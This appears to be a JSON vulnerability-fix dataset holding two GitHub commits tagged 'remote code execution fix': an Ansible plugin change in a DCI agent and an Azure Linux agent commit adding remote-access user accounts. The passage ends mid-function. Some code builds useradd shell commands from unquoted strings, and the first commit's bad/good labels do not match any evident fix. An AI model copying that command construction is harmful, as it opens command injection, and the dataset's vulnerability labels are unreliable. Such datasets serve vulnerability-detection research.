{"d7c7d42b2b3e4c024a624c2cf21b07dede26bce0": {"url": "https://api.github.com/repos/Spredzy/agent2/commits/d7c7d42b2b3e4c024a624c2cf21b07dede26bce0", "html_url": "https://github.com/Spredzy/agent2/commit/d7c7d42b2b3e4c024a624c2cf21b07dede26bce0", "message": "Ansible: Fix remote code execution", "sha": "d7c7d42b2b3e4c024a624c2cf21b07dede26bce0", "keyword": "remote code execution fix", "diff": "diff --git a/dciagent/plugins/ansibleplugin.py b/dciagent/plugins/ansibleplugin.py\nindex 8cdcbf1..b536168 100644\n--- a/dciagent/plugins/ansibleplugin.py\n+++ b/dciagent/plugins/ansibleplugin.py\n@@ -30,7 +30,6 @@\n import os\n import subprocess\n \n-display = Display()\n \n class Options(object):\n     def __init__(self, verbosity=None, inventory=None, listhosts=None, subset=None, module_paths=None, extra_vars=None,\n@@ -91,6 +90,10 @@ def __init__(self, playbook, options=None, verbosity=0):\n         if options is None:\n             self.options = Options()\n             self.options.verbosity = verbosity\n+            self.options.connection = 'ssh'\n+            self.options.become = True\n+            self.options.become_method = 'sudo'\n+            self.options.become_user = 'root'\n \n         self.loader = dataloader.DataLoader()\n         self.variable_manager = vars.VariableManager()\n@@ -105,10 +108,8 @@ def __init__(self, playbook, options=None, verbosity=0):\n         # Playbook to run, from the current working directory.\n         pb_dir = os.path.abspath('.')\n         playbook_path = \"%s/%s\" % (pb_dir, playbook)\n-        display.verbosity = self.options.verbosity\n \n         self.pbex = playbook_executor.PlaybookExecutor(\n-            #playbooks=[playbook_path],\n             playbooks=[playbook],\n             inventory=self.inventory,\n             variable_manager=self.variable_manager,\n@@ -118,6 +119,7 @@ def __init__(self, playbook, options=None, verbosity=0):\n \n     def run(self, job_id):\n         \"\"\"Run the playbook and returns the playbook's stats.\"\"\"\n+\n         self.variable_manager.extra_vars = {'job_id': job_id}\n         self.pbex.run()\n         return self.pbex._tqm._stats\n@@ -139,9 +141,6 @@ def generate_ansible_playbook_from_template(self, template_file, data):\n         return outputText\n \n \n-\n-\n-\n     def run(self, state, data=None, context=None):\n         \"\"\"Run ansible-playbook on the specified playbook. \"\"\"\n \n", "files": {"/dciagent/plugins/ansibleplugin.py": {"changes": [{"diff": "\n import os\n import subprocess\n \n-display = Display()\n \n class Options(object):\n     def __init__(self, verbosity=None, inventory=None, listhosts=None, subset=None, module_paths=None, extra_vars=None,\n", "add": 0, "remove": 1, "filename": "/dciagent/plugins/ansibleplugin.py", "badparts": ["display = Display()"], "goodparts": []}, {"diff": "\n         # Playbook to run, from the current working directory.\n         pb_dir = os.path.abspath('.')\n         playbook_path = \"%s/%s\" % (pb_dir, playbook)\n-        display.verbosity = self.options.verbosity\n \n         self.pbex = playbook_executor.PlaybookExecutor(\n-            #playbooks=[playbook_path],\n             playbooks=[playbook],\n             inventory=self.inventory,\n             variable_manager=self.variable_manager,\n", "add": 0, "remove": 2, "filename": "/dciagent/plugins/ansibleplugin.py", "badparts": ["        display.verbosity = self.options.verbosity"], "goodparts": []}], "source": "\n from ansible import inventory from ansible import vars from ansible.executor import playbook_executor from ansible.parsing import dataloader from ansible.utils.display import Display from dciclient.v1 import helper as dci_helper from dciagent.plugins import plugin import jinja2 import os import subprocess display=Display() class Options(object): def __init__(self, verbosity=None, inventory=None, listhosts=None, subset=None, module_paths=None, extra_vars=None, forks=None, ask_vault_pass=None, vault_password_files=None, new_vault_password_file=None, output_file=None, tags=None, skip_tags=None, one_line=None, tree=None, ask_sudo_pass=None, ask_su_pass=None, sudo=None, sudo_user=None, become=None, become_method=None, become_user=None, become_ask_pass=None, ask_pass=None, private_key_file=None, remote_user=None, connection=None, timeout=None, ssh_common_args=None, sftp_extra_args=None, scp_extra_args=None, ssh_extra_args=None, poll_interval=None, seconds=None, check=None, syntax=None, diff=None, force_handlers=None, flush_cache=None, listtasks=None, listtags=None, module_path=None): self.verbosity=verbosity self.inventory=inventory self.listhosts=listhosts self.subset=subset self.module_paths=module_paths self.extra_vars=extra_vars self.forks=forks self.ask_vault_pass=ask_vault_pass self.vault_password_files=vault_password_files self.new_vault_password_file=new_vault_password_file self.output_file=output_file self.tags=tags self.skip_tags=skip_tags self.one_line=one_line self.tree=tree self.ask_sudo_pass=ask_sudo_pass self.ask_su_pass=ask_su_pass self.sudo=sudo self.sudo_user=sudo_user self.become=become self.become_method=become_method self.become_user=become_user self.become_ask_pass=become_ask_pass self.ask_pass=ask_pass self.private_key_file=private_key_file self.remote_user=remote_user self.connection=connection self.timeout=timeout self.ssh_common_args=ssh_common_args self.sftp_extra_args=sftp_extra_args self.scp_extra_args=scp_extra_args self.ssh_extra_args=ssh_extra_args self.poll_interval=poll_interval self.seconds=seconds self.check=check self.syntax=syntax self.diff=diff self.force_handlers=force_handlers self.flush_cache=flush_cache self.listtasks=listtasks self.listtags=listtags self.module_path=module_path class Runner(object): def __init__(self, playbook, options=None, verbosity=0): if options is None: self.options=Options() self.options.verbosity=verbosity self.loader=dataloader.DataLoader() self.variable_manager=vars.VariableManager() self.inventory=inventory.Inventory( loader=self.loader, variable_manager=self.variable_manager, host_list='/etc/ansible/hosts' ) self.variable_manager.set_inventory(self.inventory) pb_dir=os.path.abspath('.') playbook_path=\"%s/%s\" %(pb_dir, playbook) display.verbosity=self.options.verbosity self.pbex=playbook_executor.PlaybookExecutor( playbooks=[playbook], inventory=self.inventory, variable_manager=self.variable_manager, loader=self.loader, options=self.options, passwords={}) def run(self, job_id): \"\"\"Run the playbook and returns the playbook's stats.\"\"\" self.variable_manager.extra_vars={'job_id': job_id} self.pbex.run() return self.pbex._tqm._stats class AnsiblePlugin(plugin.Plugin): def __init__(self, conf): super(AnsiblePlugin, self).__init__(conf) def generate_ansible_playbook_from_template(self, template_file, data): templateLoader=jinja2.FileSystemLoader( searchpath=\"/\") templateEnv=jinja2.Environment( loader=templateLoader) template=templateEnv.get_template( template_file) outputText=template.render( data) return outputText def run(self, state, data=None, context=None): \"\"\"Run ansible-playbook on the specified playbook. \"\"\" playbook=None log_file=None template=None if state in self.conf: if 'playbook' in self.conf[state]: playbook=self.conf[state]['playbook'] if 'log_file' in self.conf[state]: log_file=self.conf[state]['log_file'] if 'template' in self.conf[state]: template=self.conf[state]['template'] if playbook is None: playbook=self.conf['playbook'] if template is None and template in self.conf: template=self.conf['template'] if log_file is None: if 'log_file' in self.conf: log_file=self.conf['log_file'] else: log_file=open(os.devnull, 'w') if template: open(playbook, 'w').write( self.generate_ansible_playbook_from_template(template, data) ) runner=Runner(playbook=playbook, verbosity=0) stats=runner.run(job_id=context.last_job_id) ", "sourceWithComments": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#\n# Copyright (C) 2016 Red Hat, Inc\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nfrom ansible import inventory\nfrom ansible import vars\nfrom ansible.executor import playbook_executor\nfrom ansible.parsing import dataloader\n\nfrom ansible.utils.display import Display\n\nfrom dciclient.v1 import helper as dci_helper\nfrom dciagent.plugins import plugin\n\n\nimport jinja2\nimport os\nimport subprocess\n\ndisplay = Display()\n\nclass Options(object):\n    def __init__(self, verbosity=None, inventory=None, listhosts=None, subset=None, module_paths=None, extra_vars=None,\n                 forks=None, ask_vault_pass=None, vault_password_files=None, new_vault_password_file=None,\n                 output_file=None, tags=None, skip_tags=None, one_line=None, tree=None, ask_sudo_pass=None, ask_su_pass=None,\n                 sudo=None, sudo_user=None, become=None, become_method=None, become_user=None, become_ask_pass=None,\n                 ask_pass=None, private_key_file=None, remote_user=None, connection=None, timeout=None, ssh_common_args=None,\n                 sftp_extra_args=None, scp_extra_args=None, ssh_extra_args=None, poll_interval=None, seconds=None, check=None,\n                 syntax=None, diff=None, force_handlers=None, flush_cache=None, listtasks=None, listtags=None, module_path=None):\n        self.verbosity = verbosity\n        self.inventory = inventory\n        self.listhosts = listhosts\n        self.subset = subset\n        self.module_paths = module_paths\n        self.extra_vars = extra_vars\n        self.forks = forks\n        self.ask_vault_pass = ask_vault_pass\n        self.vault_password_files = vault_password_files\n        self.new_vault_password_file = new_vault_password_file\n        self.output_file = output_file\n        self.tags = tags\n        self.skip_tags = skip_tags\n        self.one_line = one_line\n        self.tree = tree\n        self.ask_sudo_pass = ask_sudo_pass\n        self.ask_su_pass = ask_su_pass\n        self.sudo = sudo\n        self.sudo_user = sudo_user\n        self.become = become\n        self.become_method = become_method\n        self.become_user = become_user\n        self.become_ask_pass = become_ask_pass\n        self.ask_pass = ask_pass\n        self.private_key_file = private_key_file\n        self.remote_user = remote_user\n        self.connection = connection\n        self.timeout = timeout\n        self.ssh_common_args = ssh_common_args\n        self.sftp_extra_args = sftp_extra_args\n        self.scp_extra_args = scp_extra_args\n        self.ssh_extra_args = ssh_extra_args\n        self.poll_interval = poll_interval\n        self.seconds = seconds\n        self.check = check\n        self.syntax = syntax\n        self.diff = diff\n        self.force_handlers = force_handlers\n        self.flush_cache = flush_cache\n        self.listtasks = listtasks\n        self.listtags = listtags\n        self.module_path = module_path\n\n\nclass Runner(object):\n\n    def __init__(self, playbook, options=None, verbosity=0):\n\n        if options is None:\n            self.options = Options()\n            self.options.verbosity = verbosity\n\n        self.loader = dataloader.DataLoader()\n        self.variable_manager = vars.VariableManager()\n\n        self.inventory = inventory.Inventory(\n            loader=self.loader,\n            variable_manager=self.variable_manager,\n            host_list='/etc/ansible/hosts'\n        )\n        self.variable_manager.set_inventory(self.inventory)\n\n        # Playbook to run, from the current working directory.\n        pb_dir = os.path.abspath('.')\n        playbook_path = \"%s/%s\" % (pb_dir, playbook)\n        display.verbosity = self.options.verbosity\n\n        self.pbex = playbook_executor.PlaybookExecutor(\n            #playbooks=[playbook_path],\n            playbooks=[playbook],\n            inventory=self.inventory,\n            variable_manager=self.variable_manager,\n            loader=self.loader,\n            options=self.options,\n            passwords={})\n\n    def run(self, job_id):\n        \"\"\"Run the playbook and returns the playbook's stats.\"\"\"\n        self.variable_manager.extra_vars = {'job_id': job_id}\n        self.pbex.run()\n        return self.pbex._tqm._stats\n\n\nclass AnsiblePlugin(plugin.Plugin):\n\n    def __init__(self, conf):\n        super(AnsiblePlugin, self).__init__(conf)\n\n\n    def generate_ansible_playbook_from_template(self, template_file, data):\n\n        templateLoader = jinja2.FileSystemLoader( searchpath=\"/\" )\n        templateEnv = jinja2.Environment( loader=templateLoader )\n        template = templateEnv.get_template( template_file )\n        outputText = template.render( data )\n\n        return outputText\n\n\n\n\n\n    def run(self, state, data=None, context=None):\n        \"\"\"Run ansible-playbook on the specified playbook. \"\"\"\n\n        playbook = None\n        log_file = None\n        template = None\n\n        if state in self.conf:\n            if 'playbook' in self.conf[state]:\n                playbook = self.conf[state]['playbook']\n            if 'log_file' in self.conf[state]:\n                log_file = self.conf[state]['log_file']\n            if 'template' in self.conf[state]:\n                template = self.conf[state]['template']\n\n        if playbook is None:\n            playbook = self.conf['playbook']\n        if template is None and template in self.conf:\n            template = self.conf['template']\n\n        if log_file is None:\n            if 'log_file' in self.conf:\n                log_file = self.conf['log_file']\n            else:\n                log_file = open(os.devnull, 'w')\n\n        if template:\n            open(playbook, 'w').write(\n                self.generate_ansible_playbook_from_template(template, data)\n            )\n            \n        runner = Runner(playbook=playbook, verbosity=0)\n        stats = runner.run(job_id=context.last_job_id)\n"}}, "msg": "Ansible: Fix remote code execution"}}, "https://github.com/Azure/WALinuxAgent": {"ee20e7e1058d24191320e54f444a5f7c22adb1e8": {"url": "https://api.github.com/repos/Azure/WALinuxAgent/commits/ee20e7e1058d24191320e54f444a5f7c22adb1e8", "html_url": "https://github.com/Azure/WALinuxAgent/commit/ee20e7e1058d24191320e54f444a5f7c22adb1e8", "message": "JIT changes for AddUserAccount (#1171)\n\n* JIT changes for AddUserAccount\r\n\r\n* Code review updates 1\r\n\r\n* testing updates\r\n\r\n* UT test execution fixes\r\n\r\n* Fixing tests for python 2.7\r\n\r\n* python 2.6 UT fix\r\n\r\n* Adding RemoteAccess.xml parsing tests and data\r\n\r\n* Code round 2 updates\r\n\r\n* correctly decode password and stop using cache file\r\n\r\n* test fix for older versions of Python\r\n\r\n* more UTs\r\n\r\n* fix raising error when no remote access URI exists in Goal State\r\n\r\n* use incarnation and reduce force updates of goal_state\r\n\r\n* Code review changes\r\n\r\n* code review fixes\r\n\r\n* changed goal_state and remote_access refresh and added tests\r\n\r\n* enum change\r\n\r\n* Code revew changes", "sha": "ee20e7e1058d24191320e54f444a5f7c22adb1e8", "keyword": "remote code execution fix", "diff": "diff --git a/azurelinuxagent/common/event.py b/azurelinuxagent/common/event.py\nindex 33e326fc8..381af5788 100644\n--- a/azurelinuxagent/common/event.py\n+++ b/azurelinuxagent/common/event.py\n@@ -67,6 +67,7 @@ class WALAEventOperation:\n     ProcessGoalState = \"ProcessGoalState\"\n     Provision = \"Provision\"\n     ProvisionGuestAgent = \"ProvisionGuestAgent\"\n+    RemoteAccessHandling = \"RemoteAccessHandling\"\n     ReportStatus = \"ReportStatus\"\n     ReportStatusExtended = \"ReportStatusExtended\"\n     Restart = \"Restart\"\ndiff --git a/azurelinuxagent/common/osutil/alpine.py b/azurelinuxagent/common/osutil/alpine.py\nindex 01a756c60..c9bb85b58 100644\n--- a/azurelinuxagent/common/osutil/alpine.py\n+++ b/azurelinuxagent/common/osutil/alpine.py\n@@ -22,9 +22,11 @@\n from azurelinuxagent.common.osutil.default import DefaultOSUtil\n \n class AlpineOSUtil(DefaultOSUtil):\n+\n     def __init__(self):\n         super(AlpineOSUtil, self).__init__()\n         self.agent_conf_file_path = '/etc/waagent.conf'\n+        self.jit_enabled = True\n \n     def is_dhcp_enabled(self):\n         return True\ndiff --git a/azurelinuxagent/common/osutil/arch.py b/azurelinuxagent/common/osutil/arch.py\nindex 55b31d9a0..1cfa2620e 100644\n--- a/azurelinuxagent/common/osutil/arch.py\n+++ b/azurelinuxagent/common/osutil/arch.py\n@@ -21,6 +21,10 @@\n from azurelinuxagent.common.osutil.default import DefaultOSUtil\n \n class ArchUtil(DefaultOSUtil):\n+    def __init__(self):\n+        super(ArchUtil, self).__init__()\n+        self.jit_enabled = True\n+    \n     def is_dhcp_enabled(self):\n         return True\n \ndiff --git a/azurelinuxagent/common/osutil/bigip.py b/azurelinuxagent/common/osutil/bigip.py\nindex c01c8dc62..c93848d4b 100644\n--- a/azurelinuxagent/common/osutil/bigip.py\n+++ b/azurelinuxagent/common/osutil/bigip.py\n@@ -41,6 +41,7 @@\n \n \n class BigIpOSUtil(DefaultOSUtil):\n+\n     def __init__(self):\n         super(BigIpOSUtil, self).__init__()\n \n@@ -132,7 +133,7 @@ def set_dhcp_hostname(self, hostname):\n         \"\"\"\n         return None\n \n-    def useradd(self, username, expiration=None):\n+    def useradd(self, username, expiration=None, comment=None):\n         \"\"\"Create user account using tmsh\n \n         Our policy is to create two accounts when booting a BIG-IP instance.\n@@ -143,6 +144,7 @@ def useradd(self, username, expiration=None):\n         :param username: The username that you want to add to the system\n         :param expiration: The expiration date to use. We do not use this\n                            value.\n+        :param comment: description of the account.  We do not use this value.\n         \"\"\"\n         if self.get_userentry(username):\n             logger.info(\"User {0} already exists, skip useradd\", username)\ndiff --git a/azurelinuxagent/common/osutil/clearlinux.py b/azurelinuxagent/common/osutil/clearlinux.py\nindex 10d394b0a..39ca31382 100644\n--- a/azurelinuxagent/common/osutil/clearlinux.py\n+++ b/azurelinuxagent/common/osutil/clearlinux.py\n@@ -34,9 +34,11 @@\n from azurelinuxagent.common.osutil.default import DefaultOSUtil\n \n class ClearLinuxUtil(DefaultOSUtil):\n+\n     def __init__(self):\n         super(ClearLinuxUtil, self).__init__()\n         self.agent_conf_file_path = '/usr/share/defaults/waagent/waagent.conf'\n+        self.jit_enabled = True\n \n     def is_dhcp_enabled(self):\n         return True\ndiff --git a/azurelinuxagent/common/osutil/coreos.py b/azurelinuxagent/common/osutil/coreos.py\nindex b9525917a..ab0b00922 100644\n--- a/azurelinuxagent/common/osutil/coreos.py\n+++ b/azurelinuxagent/common/osutil/coreos.py\n@@ -21,11 +21,13 @@\n from azurelinuxagent.common.osutil.default import DefaultOSUtil\n \n class CoreOSUtil(DefaultOSUtil):\n+\n     def __init__(self):\n         super(CoreOSUtil, self).__init__()\n         self.agent_conf_file_path = '/usr/share/oem/waagent.conf'\n         self.waagent_path = '/usr/share/oem/bin/waagent'\n         self.python_path = '/usr/share/oem/python/bin'\n+        self.jit_enabled = True\n         if 'PATH' in os.environ:\n             path = \"{0}:{1}\".format(os.environ['PATH'], self.python_path)\n         else:\ndiff --git a/azurelinuxagent/common/osutil/debian.py b/azurelinuxagent/common/osutil/debian.py\nindex 92ba1d777..91788142a 100644\n--- a/azurelinuxagent/common/osutil/debian.py\n+++ b/azurelinuxagent/common/osutil/debian.py\n@@ -33,8 +33,10 @@\n from azurelinuxagent.common.osutil.default import DefaultOSUtil\n \n class DebianOSUtil(DefaultOSUtil):\n+\n     def __init__(self):\n         super(DebianOSUtil, self).__init__()\n+        self.jit_enabled = True\n \n     def restart_ssh_service(self):\n         return shellutil.run(\"systemctl --job-mode=ignore-dependencies try-reload-or-restart ssh\", chk_err=False)\ndiff --git a/azurelinuxagent/common/osutil/default.py b/azurelinuxagent/common/osutil/default.py\nindex 32a90e309..34a049aab 100644\n--- a/azurelinuxagent/common/osutil/default.py\n+++ b/azurelinuxagent/common/osutil/default.py\n@@ -44,6 +44,8 @@\n from azurelinuxagent.common.utils.cryptutil import CryptUtil\n from azurelinuxagent.common.utils.flexible_version import FlexibleVersion\n \n+from pwd import getpwall\n+\n __RULES_FILES__ = [ \"/lib/udev/rules.d/75-persistent-net-generator.rules\",\n                     \"/etc/udev/rules.d/70-persistent-net.rules\" ]\n \n@@ -96,6 +98,7 @@ def __init__(self):\n         self.agent_conf_file_path = '/etc/waagent.conf'\n         self.selinux = None\n         self.disable_route_warning = False\n+        self.jit_enabled = False\n \n     def get_firewall_dropped_packets(self, dst_ip=None):\n         # If a previous attempt failed, do not retry\n@@ -342,7 +345,7 @@ def is_sys_user(self, username):\n         else:\n             return False\n \n-    def useradd(self, username, expiration=None):\n+    def useradd(self, username, expiration=None, comment=None):\n         \"\"\"\n         Create user account with 'username'\n         \"\"\"\n@@ -355,6 +358,9 @@ def useradd(self, username, expiration=None):\n             cmd = \"useradd -m {0} -e {1}\".format(username, expiration)\n         else:\n             cmd = \"useradd -m {0}\".format(username)\n+        \n+        if comment is not None:\n+            cmd += \" -c {0}\".format(comment)\n         retcode, out = shellutil.run_get_output(cmd)\n         if retcode != 0:\n             raise OSUtilError((\"Failed to create user account:{0}, \"\n@@ -371,6 +377,9 @@ def chpasswd(self, username, password, crypt_id=6, salt_len=10):\n         if ret != 0:\n             raise OSUtilError((\"Failed to set password for {0}: {1}\"\n                                \"\").format(username, output))\n+    \n+    def get_users(self):\n+        return getpwall()\n \n     def conf_sudoer(self, username, nopasswd=False, remove=False):\n         sudoers_dir = conf.get_sudoers_dir()\ndiff --git a/azurelinuxagent/common/osutil/freebsd.py b/azurelinuxagent/common/osutil/freebsd.py\nindex 9295f58ae..6d10e65fe 100644\n--- a/azurelinuxagent/common/osutil/freebsd.py\n+++ b/azurelinuxagent/common/osutil/freebsd.py\n@@ -25,9 +25,11 @@\n from azurelinuxagent.common.future import ustr\n \n class FreeBSDOSUtil(DefaultOSUtil):\n+\n     def __init__(self):\n         super(FreeBSDOSUtil, self).__init__()\n         self._scsi_disks_timeout_set = False\n+        self.jit_enabled = True\n \n     def set_hostname(self, hostname):\n         rc_file_path = '/etc/rc.conf'\n@@ -39,7 +41,7 @@ def set_hostname(self, hostname):\n     def restart_ssh_service(self):\n         return shellutil.run('service sshd restart', chk_err=False)\n \n-    def useradd(self, username, expiration=None):\n+    def useradd(self, username, expiration=None, comment=None):\n         \"\"\"\n         Create user account with 'username'\n         \"\"\"\n@@ -47,11 +49,12 @@ def useradd(self, username, expiration=None):\n         if userentry is not None:\n             logger.warn(\"User {0} already exists, skip useradd\", username)\n             return\n-\n         if expiration is not None:\n             cmd = \"pw useradd {0} -e {1} -m\".format(username, expiration)\n         else:\n             cmd = \"pw useradd {0} -m\".format(username)\n+        if comment is not None:\n+            cmd += \" -c {0}\".format(comment)\n         retcode, out = shellutil.run_get_output(cmd)\n         if retcode != 0:\n             raise OSUtilError((\"Failed to create user account:{0}, \"\ndiff --git a/azurelinuxagent/common/osutil/gaia.py b/azurelinuxagent/common/osutil/gaia.py\nindex 748816e05..a783c59a5 100644\n--- a/azurelinuxagent/common/osutil/gaia.py\n+++ b/azurelinuxagent/common/osutil/gaia.py\n@@ -33,6 +33,7 @@\n \n \n class GaiaOSUtil(DefaultOSUtil):\n+\n     def __init__(self):\n         super(GaiaOSUtil, self).__init__()\n \ndiff --git a/azurelinuxagent/common/osutil/openbsd.py b/azurelinuxagent/common/osutil/openbsd.py\nindex 1b10ab23c..2e3a20ef8 100644\n--- a/azurelinuxagent/common/osutil/openbsd.py\n+++ b/azurelinuxagent/common/osutil/openbsd.py\n@@ -36,8 +36,10 @@\n     re.IGNORECASE)\n \n class OpenBSDOSUtil(DefaultOSUtil):\n+\n     def __init__(self):\n         super(OpenBSDOSUtil, self).__init__()\n+        self.jit_enabled = True\n         self._scsi_disks_timeout_set = False\n \n     def get_instance_id(self):\ndiff --git a/azurelinuxagent/common/osutil/redhat.py b/azurelinuxagent/common/osutil/redhat.py\nindex 7e35e305c..2f0ca5764 100644\n--- a/azurelinuxagent/common/osutil/redhat.py\n+++ b/azurelinuxagent/common/osutil/redhat.py\n@@ -38,8 +38,10 @@\n \n \n class Redhat6xOSUtil(DefaultOSUtil):\n+\n     def __init__(self):\n         super(Redhat6xOSUtil, self).__init__()\n+        self.jit_enabled = True\n \n     def start_network(self):\n         return shellutil.run(\"/sbin/service networking start\", chk_err=False)\ndiff --git a/azurelinuxagent/common/osutil/suse.py b/azurelinuxagent/common/osutil/suse.py\nindex 1ec65cbac..05f2ce312 100644\n--- a/azurelinuxagent/common/osutil/suse.py\n+++ b/azurelinuxagent/common/osutil/suse.py\n@@ -33,8 +33,10 @@\n from azurelinuxagent.common.osutil.default import DefaultOSUtil\n \n class SUSE11OSUtil(DefaultOSUtil):\n+\n     def __init__(self):\n         super(SUSE11OSUtil, self).__init__()\n+        self.jit_enabled = True\n         self.dhclient_name='dhcpcd'\n \n     def set_hostname(self, hostname):\ndiff --git a/azurelinuxagent/common/osutil/ubuntu.py b/azurelinuxagent/common/osutil/ubuntu.py\nindex ac7bc3a30..ade396fd8 100644\n--- a/azurelinuxagent/common/osutil/ubuntu.py\n+++ b/azurelinuxagent/common/osutil/ubuntu.py\n@@ -32,8 +32,10 @@ def _cgroup_path(tail=\"\"):\n \n \n class Ubuntu14OSUtil(DefaultOSUtil):\n+\n     def __init__(self):\n         super(Ubuntu14OSUtil, self).__init__()\n+        self.jit_enabled = True\n \n     def start_network(self):\n         return shellutil.run(\"service networking start\", chk_err=False)\ndiff --git a/azurelinuxagent/common/protocol/restapi.py b/azurelinuxagent/common/protocol/restapi.py\nindex 7bcdd70cc..771006d14 100644\n--- a/azurelinuxagent/common/protocol/restapi.py\n+++ b/azurelinuxagent/common/protocol/restapi.py\n@@ -303,6 +303,16 @@ class TelemetryEventList(DataContract):\n     def __init__(self):\n         self.events = DataContractList(TelemetryEvent)\n \n+class RemoteAccessUser(DataContract):\n+    def __init__(self, name, encrypted_password, expiration):\n+        self.name = name\n+        self.encrypted_password = encrypted_password\n+        self.expiration = expiration\n+\n+class RemoteAccessUsersList(DataContract):\n+    def __init__(self):\n+        self.users = DataContractList(RemoteAccessUser)\n+\n \n class Protocol(DataContract):\n     def detect(self):\ndiff --git a/azurelinuxagent/common/protocol/wire.py b/azurelinuxagent/common/protocol/wire.py\nindex fb8216ff3..5db1fbcc9 100644\n--- a/azurelinuxagent/common/protocol/wire.py\n+++ b/azurelinuxagent/common/protocol/wire.py\n@@ -22,6 +22,7 @@\n import os\n import random\n import re\n+import sys\n import time\n import xml.sax.saxutils as saxutils\n \n@@ -40,6 +41,7 @@\n from azurelinuxagent.common.utils.textutil import parse_doc, findall, find, \\\n     findtext, getattrib, gettext, remove_bom, get_bytes_from_pem, parse_json\n from azurelinuxagent.common.version import AGENT_NAME\n+from azurelinuxagent.common.osutil import get_osutil\n \n VERSION_INFO_URI = \"http://{0}/?comp=versions\"\n GOAL_STATE_URI = \"http://{0}/machine/?comp=goalstate\"\n@@ -53,6 +55,7 @@\n HOSTING_ENV_FILE_NAME = \"HostingEnvironmentConfig.xml\"\n SHARED_CONF_FILE_NAME = \"SharedConfig.xml\"\n CERTS_FILE_NAME = \"Certificates.xml\"\n+REMOTE_ACCESS_FILE_NAME = \"RemoteAccess.{0}.xml\"\n P7M_FILE_NAME = \"Certificates.p7m\"\n PEM_FILE_NAME = \"Certificates.pem\"\n EXT_CONF_FILE_NAME = \"ExtensionsConfig.{0}.xml\"\n@@ -529,6 +532,7 @@ def __init__(self, endpoint):\n         self.updated = None\n         self.hosting_env = None\n         self.shared_conf = None\n+        self.remote_access = None\n         self.certs = None\n         self.ext_conf = None\n         self.host_plugin = None\n@@ -699,6 +703,29 @@ def update_certs(self, goal_state):\n         self.save_cache(local_file, xml_text)\n         self.certs = Certificates(self, xml_text)\n \n+    def update_remote_access_conf(self, goal_state):\n+        if goal_state.remote_access_uri is None:\n+            # Nothing in accounts data.  Just return, nothing to do.\n+            return\n+        xml_text = self.fetch_config(goal_state.remote_access_uri, \n+                                     self.get_header_for_cert())\n+        self.remote_access = RemoteAccess(xml_text)\n+        local_file = os.path.join(conf.get_lib_dir(), REMOTE_ACCESS_FILE_NAME.format(self.remote_access.incarnation))\n+        self.save_cache(local_file, xml_text)\n+\n+    def get_remote_access(self):\n+        incarnation_file = os.path.join(conf.get_lib_dir(),\n+                                        INCARNATION_FILE_NAME)\n+        incarnation = self.fetch_cache(incarnation_file)\n+        file_name = REMOTE_ACCESS_FILE_NAME.format(incarnation)\n+        remote_access_file = os.path.join(conf.get_lib_dir(), file_name)\n+        if not os.path.isfile(remote_access_file):\n+            # no remote access data.\n+            return None\n+        xml_text = self.fetch_cache(remote_access_file)\n+        remote_access = RemoteAccess(xml_text)\n+        return remote_access\n+        \n     def update_ext_conf(self, goal_state):\n         if goal_state.ext_uri is None:\n             logger.info(\"ExtensionsConfig.xml uri is empty\")\n@@ -732,8 +759,7 @@ def update_goal_state(self, forced=False, max_retry=3):\n                         if last_incarnation is not None and \\\n                                         last_incarnation == new_incarnation:\n                             # Goalstate is not updated.\n-                            return\n-\n+                            return                \n                 self.goal_state_flusher.flush(datetime.utcnow())\n \n                 self.goal_state = goal_state\n@@ -744,6 +770,7 @@ def update_goal_state(self, forced=False, max_retry=3):\n                 self.update_shared_conf(goal_state)\n                 self.update_certs(goal_state)\n                 self.update_ext_conf(goal_state)\n+                self.update_remote_access_conf(goal_state)\n                 self.save_cache(incarnation_file, goal_state.incarnation)\n \n                 if self.host_plugin is not None:\n@@ -817,7 +844,7 @@ def get_ext_conf(self):\n                 local_file = os.path.join(conf.get_lib_dir(), local_file)\n                 xml_text = self.fetch_cache(local_file)\n                 self.ext_conf = ExtensionsConfig(xml_text)\n-        return self.ext_conf\n+        return self.ext_conf      \n \n     def get_ext_manifest(self, ext_handler, goal_state):\n         for update_goal_state in [False, True]:\n@@ -1207,6 +1234,7 @@ def __init__(self, xml_text):\n         self.expected_state = None\n         self.hosting_env_uri = None\n         self.shared_conf_uri = None\n+        self.remote_access_uri = None\n         self.certs_uri = None\n         self.ext_uri = None\n         self.role_instance_id = None\n@@ -1234,6 +1262,7 @@ def parse(self, xml_text):\n         self.role_config_name = findtext(role_config, \"ConfigName\")\n         container = find(xml_doc, \"Container\")\n         self.container_id = findtext(container, \"ContainerId\")\n+        self.remote_access_uri = findtext(container, \"RemoteAccessInfo\")\n         lbprobe_ports = find(xml_doc, \"LBProbePorts\")\n         self.load_balancer_probe_port = findtext(lbprobe_ports, \"Port\")\n         return self\n@@ -1287,6 +1316,70 @@ def parse(self, xml_text):\n         return self\n \n \n+class RemoteAccess(object):\n+    \"\"\"\n+    Object containing information about user accounts\n+    \"\"\"\n+    #\n+    # <RemoteAccess>\n+    #   <Version/>\n+    #   <Incarnation/>\n+    #    <Users>\n+    #       <User>\n+    #         <Name/>\n+    #         <Password/>\n+    #         <Expiration/>\n+    #       </User>\n+    #     </Users>\n+    #   </RemoteAccess>\n+    #\n+\n+    def __init__(self, xml_text):\n+        logger.verbose(\"Load RemoteAccess.xml\")\n+        self.version = None\n+        self.incarnation = None\n+        self.user_list = RemoteAccessUsersList()\n+\n+        self.xml_text = None\n+        self.parse(xml_text)\n+\n+    def parse(self, xml_text):\n+        \"\"\"\n+        Parse xml document containing user account information\n+        \"\"\"\n+        if xml_text is None or len(xml_text) == 0:\n+            return None\n+        self.xml_text = xml_text\n+        xml_doc = parse_doc(xml_text)\n+        self.incarnation = findtext(xml_doc, \"Incarnation\")\n+        self.version = findtext(xml_doc, \"Version\")\n+        user_collection = find(xml_doc, \"Users\")\n+        users = findall(user_collection, \"User\")\n+\n+        for user in users:\n+            remote_access_user = self.parse_user(user)\n+            self.user_list.users.append(remote_access_user)\n+        return self\n+\n+    def parse_user(self, user):\n+        name = findtext(user, \"Name\")\n+        encrypted_password = findtext(user, \"Password\")\n+        expiration = findtext(user, \"Expiration\")\n+        remote_access_user = RemoteAccessUser(name, encrypted_password, expiration)\n+        return 